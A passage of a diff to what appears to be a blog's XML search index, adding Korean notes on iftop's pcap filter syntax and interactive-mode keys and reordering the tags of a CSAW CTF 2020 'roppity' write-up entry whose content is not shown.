id="pcap-filter"><a href="#pcap-filter" class="headerlink" title="pcap-filter"></a>pcap-filter</h3><p>dst host hostname    목적지 호스트네임(IP주소)<br>src host hostname    출발지 호스트네임(IP주소)<br>dst port port    목적지 포트<br>src port port    출발지 포트<br>ip proto protocol    프로토콜 유형<br>ether dst ehost    이더넷 목적지 주소가 ehost인지 체크<br>ether src ehost    이더넷 출발지 주소가 ehost인지 체크<br>ether host ehost    이더넷 출발지 또는 목적지 주소가 ehost인지 체크<br>gateway hostname    게이트웨이 호스트네임(IP주소)</p><h3 id="interactive-mode"><a href="#interactive-mode" class="headerlink" title="interactive-mode"></a>interactive-mode</h3><p>n    DNS Resolution on/off<br>s    Source Host Hide/UnHide<br>d    Destination Host Hide/UnHide<br>t    Cycle Line<br>N    Port Resolution on/off<br>S    Port Display(SRC) on/off<br>D    Port Display(DST) on/off<br>p    Port Display on/off<br>&lt;    Sort by Source<br>| Sort by Destination<br>o | Order by frozen/unfrozen<br>P | Pause Display<br>h | help<br>b | bar on/off<br>B | bar show 2/10/40(s) average<br>T | cumulative totals show/hide<br>j,k | scroll display<br>f | net-filter<br>l | screen-filter<br>L | lin/log scales<br>! | shell command(default: disabled)<br>q | quit</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> iftop </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CSAW CTF 2020 roppity Write up</title>
       <link href="2020/09/14/csawctf-200914/"/>
       <url>2020/09/14/csawctf-200914/</url>
@@ -20,11 +186,11 @@
       
         <tags>
             
-            <tag> CSAWCTF 2020 </tag>
-            
             <tag> Pwnable </tag>
             
             <tag> ROP </tag>
+            
+            <tag> CSAWCTF 2020 </tag>
             
         </tags>
       
